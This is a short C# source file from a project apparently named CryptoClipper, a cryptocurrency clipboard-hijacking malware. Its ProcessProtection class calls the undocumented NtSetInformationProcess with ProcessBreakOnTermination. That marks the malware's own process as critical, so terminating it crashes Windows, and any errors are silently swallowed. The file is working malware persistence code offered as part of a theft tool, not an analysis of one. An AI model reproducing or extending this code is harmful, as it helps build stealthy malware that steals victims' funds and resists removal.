using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;

namespace CryptoClipper.Stealth;

[SupportedOSPlatform("windows")]
public static partial class ProcessProtection
{
    [LibraryImport("ntdll.dll", SetLastError = true)]
    private static partial int NtSetInformationProcess(
        nint processHandle,
        int processInformationClass,
        ref int processInformation,
        int processInformationLength);

    private const int ProcessBreakOnTermination = 0x1D;

    public static void ProtectCurrentProcess()
    {
        try
        {
            int isCritical = 1;
            _ = NtSetInformationProcess(
                Process.GetCurrentProcess().Handle,
                ProcessBreakOnTermination,
                ref isCritical,
                sizeof(int));
        }
        catch
        {
            // Requires SeDebugPrivilege
        }
    }

    public static void UnprotectCurrentProcess()
    {
        try
        {
            int isCritical = 0;
            _ = NtSetInformationProcess(
                Process.GetCurrentProcess().Handle,
                ProcessBreakOnTermination,
                ref isCritical,
                sizeof(int));
        }
        catch
        {
            // Silent fallback
        }
    }
}
